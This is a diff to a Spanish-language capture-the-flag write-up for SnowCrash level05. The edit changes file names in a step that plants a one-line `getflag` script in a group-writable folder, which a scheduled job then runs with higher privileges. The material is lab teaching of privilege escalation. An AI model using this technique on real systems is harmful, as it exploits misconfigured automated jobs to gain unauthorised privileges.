@@ -87,7 +87,9 @@ Confirmamos que el grupo `level05` tiene permisos de escritura en la carpeta.
 Creamos un script malicioso diseñado para ejecutar `getflag` y redirigir la salida a un archivo legible en `/tmp`:
 
 ```bash
-echo "/bin/getflag > /tmp/token" > /opt/openarenaserver/token
+level05@SnowCrash:~$ echo "/bin/getflag > /tmp/my_file" > /opt/openarenaserver/my_file
+level05@SnowCrash:~$ cat /opt/openarenaserver/my_file
+/bin/getflag > /tmp/my_file
 ```
 
 ### Paso 3: Ejecución Automática
@@ -106,10 +108,10 @@ ls /opt/openarenaserver/token
 
 ## 4. Resultado y Resolución
 
-Una vez que el script automático ejecutó nuestro archivo `break.sh`, el token se generó en la ruta especificada:
+Una vez que el script automático ejecutó nuestro archivo `my_file`, el token se generó en la ruta especificada:
 
 ```bash
-cat /tmp/token
+cat /tmp/my_file
 
 ```
 
